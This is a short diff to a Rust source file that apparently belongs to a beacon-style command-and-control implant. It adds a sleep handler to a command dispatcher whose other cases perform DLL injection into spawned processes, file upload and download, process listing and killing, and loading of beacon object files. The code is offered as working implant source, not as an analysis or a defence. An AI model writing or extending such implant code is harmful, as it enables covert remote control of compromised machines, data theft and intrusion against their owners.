@@ -1,4 +1,5 @@
 use crate::beacon::bof::bof_loader;
+use crate::beacon::sleep::beacon_sleep;
 use crate::beacon::exit::beacon_exit;
 use crate::beacon::file::{cp, download, file_browse, list_drives, mkdir, mv, rm, upload};
 use crate::beacon::proc::{kill_process, ps};
@@ -10,7 +11,7 @@ use std::io::Cursor;
 /// Command types
 pub const CMD_TYPE_SPAWN_IGNORE_TOKEN_X86: u32 = 1; // 0x01
 pub const CMD_TYPE_EXIT: u32 = 3; // 0x03
-const CMD_TYPE_SLEEP: u32 = 4; // 0x04
+pub const CMD_TYPE_SLEEP: u32 = 4; // 0x04
 pub const CMD_TYPE_CD: u32 = 5; // 0x05
 pub const CMD_TYPE_INJECT_X86: u32 = 9; // 0x09
 pub const CMD_TYPE_UPLOAD_START: u32 = 10; // 0x0A
@@ -44,6 +45,7 @@ pub fn command_handle(cmd_type: u32, cmd: Cursor<Vec<u8>>) {
     match cmd_type {
         CMD_TYPE_SPAWN_IGNORE_TOKEN_X86 => spawn_and_inject_dll(cmd, false, true),
         CMD_TYPE_EXIT => beacon_exit(),
+        CMD_TYPE_SLEEP => beacon_sleep(cmd),
         CMD_TYPE_INJECT_X86 => inject_dll(cmd, false),
         CMD_TYPE_UPLOAD_START => upload(cmd, true),
         CMD_TYPE_DOWNLOAD => download(cmd),
